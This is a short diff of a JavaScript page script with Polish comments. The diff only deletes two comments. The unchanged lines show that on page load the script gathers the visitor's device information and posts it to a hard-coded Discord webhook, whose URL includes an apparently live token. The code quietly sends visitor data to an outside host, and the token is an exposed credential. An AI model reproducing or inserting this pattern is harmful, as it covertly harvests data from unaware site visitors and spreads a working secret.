@@ -1,10 +1,8 @@
 document.addEventListener('DOMContentLoaded', function() {
     var webhookURL = 'https://discord.com/api/webhooks/1255133774920945754/sl9zqSXyg5iHmfcBVl06SBRIQDfrz_r6l0dlwcacYU-pF3T99wNLJFAP29cfTGpraz4M'; // Zmień na właściwy URL webhooka Discorda
 
-    // Pobierz informacje o urządzeniu użytkownika
     var deviceInfo = getDeviceInfo();
 
-    // Wyślij webhooka do Discorda
     sendWebhookToDiscord(webhookURL, deviceInfo);
 });
 
